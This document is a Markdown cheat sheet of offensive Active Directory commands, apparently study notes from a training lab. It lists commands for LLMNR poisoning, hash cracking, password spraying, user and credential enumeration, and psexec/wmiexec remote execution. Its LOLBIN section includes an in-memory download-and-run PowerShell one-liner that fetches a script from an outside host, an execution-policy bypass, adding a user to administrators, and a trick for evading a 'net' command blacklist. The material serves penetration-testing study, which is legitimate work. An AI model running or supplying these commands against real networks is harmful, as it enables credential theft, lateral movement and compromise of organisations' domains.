# AD Cheatsheet
## LLMNR/NBT-NS Poisoning
**From Linux**
```bash
sudo responder -I <NETWORK_INTERFACE>
```
```shell-session
hashcat -m 5600 password.hash /usr/share/wordlists/rockyou.txt 
```

**From Windows**
```powershell-session
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell-session
.\Inveigh.exe
```

---

## Password Policies
**With Credentials**
```shell-session
crackmapexec smb IP_ADDR -u USRNAME -p PASSWORD --pass-pol
```

**SMB NULL Sessions**
```shell-session
rpcclient -U "" -N 172.16.5.5
rpcclient $> getdompwinfo
```
```shell-session
enum4linux -P IP_ADDR
```

**LDAP Anonymous Bind**
```shell-session
ldapsearch -h IP_ADDR -x -b "DC=DOMAIN,DC=COM" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**With net.exe & PowerView**
```cmd-session
net accounts
```

```powershell-session
import-module .\PowerView.ps1
Get-DomainPolicy
```

---

## User Enumeration
**SMB NULL Session**
```shell-session
enum4linux -U IP_ADDR  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```shell-session
rpcclient -U "" -N IP_ADDR
rpcclient $> enumdomusers
```

```shell-session
crackmapexec smb IP_ADDR --users
```

**LDAP Anonymous Bind**
```shell-session
ldapsearch -h IP_ADDR -x -b "DC=DOMAIN,DC=COM" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

```shell-session
./windapsearch.py --dc-ip IP_ADDR -u "" -U
```

**Kerberos Pre-Authentication**
```shell-session
kerbrute userenum -d domain.com --dc IP_ADDR users.list
```

**With Credentials**
```shell-session
sudo crackmapexec smb IP_ADDR -u USERNAME -p PASSWORD --users
```

---

## Password Spraying
**From Linux**
```shell-session
for u in $(cat users.list);do rpcclient -U "$u%PASSWORD" -c "getusername;quit" IP_ADDR | grep Authority; done
```

```shell-session
kerbrute passwordspray -d DOMAIN.COM --dc IP_ADDR users.list PASSWORD 
```

```shell-session
sudo crackmapexec smb IP_ADDR -u users.list -p PASSWORD | grep +
```

```shell-session
sudo crackmapexec smb IP_ADDR -u USERNAME -p PASSWORD
```
```
sudo crackmapexec smb --local-auth IP_ADDR/23 -u USERNAME -H PASSWORD_HASH | grep +
```

**From Windows**
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password PASSWORD -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Enumerating Security Controls
**Windows Defender**
```powershell-session
Get-MpComputerStatus
```

**AppLocker**
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**PS Constrained Language Model**
```powershell-session
$ExecutionContext.SessionState.LanguageMode
```

**LAPS**
```powershell-session
Find-LAPSDelegatedGroups
```
```powershell-session
Find-AdmPwdExtendedRights
```
```powershell-session
Get-LAPSComputers
```

---

## Credential Enumeration
```shell-session
sudo crackmapexec smb IP_ADDR -u USERNAME -p PASSWORD --users
sudo crackmapexec smb IP_ADDR -u USERNAME -p PASSWORD --groups
sudo crackmapexec smb IP_ADDR -u USERNAME -p PASSWORD --loggedon-users
sudo crackmapexec smb IP_ADDR -u USERNAME -p PASSWORD --shares
```

```shell-session
smbmap -u USERNAME -p PASSWORD -d DOMAIN.COM -H IP_ADDR
```

```bash
rpcclient -U "" -N IP_ADDR
enumdomusers
queryuser USER_ID
```

```bash
python3 psexec.py DOMAIN.COM/USERNAME:'PASSWORD'@IP_ADDR
python3 wmiexec.py DOMAIN.COM/USERNAME:'PASSWORD'@IP_ADDR
```

```
python3 windapsearch.py --dc-ip IP_ADDR -u USERNAME@DOMAIN.COM -p PASSWORD --da
python3 windapsearch.py --dc-ip IP_ADDR -u USERNAME@DOMAIN.COM -p PASSWORD --PU
```

```shell-session
sudo bloodhound-python -u 'USERANAME' -p 'PASSWORD' -ns IP_ADDR -d DOMAIN.COM -c all 
```

**Get Domain Info**
```powershell-session
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Check for Trust Relationships**
```powershell-session
Get-ADTrust -Filter *
```

**Group Enumeration**
```powershell-session
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "GROUP_NAME"
Get-ADGroupMember -Identity "GROUP_NAME"
```

**Domain User Information**
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

**Recursive Group Membership**
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

**Trust Enumeration**
```powershell-session
Get-DomainTrustMapping
```

**Testing for Local Admin Access**
```powershell-session
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

**Finding Users With SPN Set**
```powershell-session
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

**Domain Graphing with SharpHound & BloodHound**
```powershell-session
.\SharpHound.exe -c All --zipfilename OUTPUT
```

**Extracting Credentials with Snaffler**
```powershell-session
.\Snaffler.exe -d DOMAIN.COM -s -v data
```

---

## LOLBIN Enumeration
**Host Enumeration**
```
hostname | Print PC Name
[System.Environment]::OSVersion.Version | Print OS Version
wmic qfe get Caption,Description,HotFixID,InstalledOn | Print patches applied to host
set %USERDOMAIN% | Displays domain name of the host
set %logonserver% | Print name of DC
Get-Module | Lists available modules loaded for use
Get-ExecutionPolicy -List | Print the execution policy
Set-ExecutionPolicy Bypass -Scope Process | Change policy for our current process
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | Get the specified user's PowerShell history
Get-ChildItem Env: \| ft Key,Value | Return environment values
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10:9001/otter.ps1'); echo hello " | Download a file and call it from memory
qwinsta | Check if there are other users in the session
```

**Checking Defenses**
```
netsh advfirewall show allprofiles | Checks WindowsDefender status
sc query windefend | Checks WindowsDefender from cmd.exe
Get-MpComputerStatus | Get WindowsDefender config
netsh advfirewall show state | Display status of the firewall
```

**Network Information**
```
arp -a | List hosts in ARP cache
ipconfig /all | Print network adapter config
route print | Display routing table
```

**WMI**
```
wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints patches and hotfixes applied
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information
wmic process list /format:list | List all running processes
wmic ntdomain list /format:list | Display info about the domain and the DCs
wmic useraccount list /format:list | Display info about user account
wmic group list /format:list | Information about local groups
wmic sysaccount list /format:list | Information about system accounts
```

**Net.exe**
```
net accounts | Information about password requirements
net accounts /domain | Password and lockout policy
net group /domain`| Information about domain groups
net group "Domain Admins" /domain`| List users with domain admin privileges
net group "domain computers" /domain | List of PCs connected to the domain
net group "Domain Controllers" /domain | List PC accounts of domains controllers
net group <domain_group_name> /domain | User that belongs to the group
net groups /domain`| List of domain groups
net localgroup | All available groups
net localgroup administrators /domain | List users that belong to the administrators group inside the domain
net localgroup Administrators | Information about a group (admins)
net localgroup administrators [username] /add | Add user to administrators
net share | Check current shares
net user <ACCOUNT_NAME> /domain | Get information about a user within the domain
net user /domain | List all users of the domain
net user %username% | Information about the current user
net use x: \computer\share | Mount the share locally
net view | Get a list of computers
net view /all /domain[:domainname] | Shares on the domains
net view \computer /ALL | List shares of a computer
net view /domain | List of PCs of the domain
```
If the `net` string is blacklisted, the `net1` string has the same functionality.

**Dsquery User Search**
```powershell-session
dsquery user
```

**Dsquery Computer Search**
```powershell-session
dsquery computer
```

**Dsquery Wildcard Search**
```powershell-session
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

**Dsquery LDAP filter for DCs**
```powershell-session
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```